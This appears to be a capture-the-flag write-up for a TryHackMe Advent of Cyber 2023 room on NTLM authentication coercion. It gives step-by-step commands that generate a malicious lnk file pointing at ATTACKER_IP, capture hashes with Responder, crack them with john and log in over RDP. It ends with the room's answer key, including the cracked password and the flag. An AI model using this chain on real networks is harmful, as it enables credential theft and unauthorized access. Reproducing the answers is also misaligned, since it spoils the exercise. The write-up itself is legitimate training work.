# Task 29  [Day 23] Coerced Authentication Relay All the Way

---

Learning Objectives
- The basics of network file shares
- Understanding NTLM authentication
- How NTLM authentication coercion attacks work
- How Responder works for authentication coercion attacks
- Forcing authentication coercion using lnk files
---

After the machine is up.

**As mentioned in the challenge use attackbox.**

Access the attack box 

go to 
```
cd /root/Rooms/AoC2023/Day23/ntlm_theft/
```

we will create an lnk file using the following command:
```
python3 ntlm_theft.py -g lnk -s ATTACKER_IP -f stealthy
```

<img width="1440" alt="Screenshot 2024-01-15 at 4 32 10 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/75057774-2f32-4b98-9d8e-634b7cf324ec">

---

Download greedkeys.txt it will be used as a wordlist to crack NTLM hash.

```
get greedykeys.txt
```

Now open up new terminal and run 
```
responder -I ens5
```
---

After a while it will capture NTLM HASH

<img width="1440" alt="Screenshot 2024-01-15 at 4 39 35 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/74fdd9ee-91a0-42f2-8794-4cca69a9d84b">

---

Copy NTLM hash and save it.....

To crack the hash simply run:

```
└─$ john hash.txt --wordlist=greedykeys.txt 
```

---

You will get the password:
```
USER:Administrator
PASSWORD:GreedyGrabber1@
```

Now we can use xfreerdp to acces the machine.

In your local kali machine open up the terminal and type:

```
xfreerdp /v:10.10.56.141 /u:Administrator /p:'GreedyGrabber1@' /cert:ignore +clipboard /dynamic-resolution 
```

You will get a connection:

<img width="1440" alt="Screenshot 2024-01-15 at 4 59 21 PM" src="https://github.com/Lynk4/Advent-of-Cyber-2023/assets/44930131/209aff27-86d6-4261-8371-4c97c4108906">


and the flag is in the Desktop.




---







**QUESTIONS**

1. What is the name of the AD authentication protocol that makes use of tickets?

ANSWER
```
Kerberos
```

---

2. What is the name of the AD authentication protocol that makes use of the NTLM hash?

ANSWER
```
NetNTLM
```

---


3. What is the name of the tool that can intercept these authentication challenges?

ANSWER
```
Responder
```

---


4. What is the password that McGreedy set for the Administrator account?

ANSWER
```
GreedyGrabber1@
```

---


5. What is the value of the flag that is placed on the Administrator’s desktop?

ANSWER
```
THM{Greedy.Greedy.McNot.So.Great.Stealy}
```

---
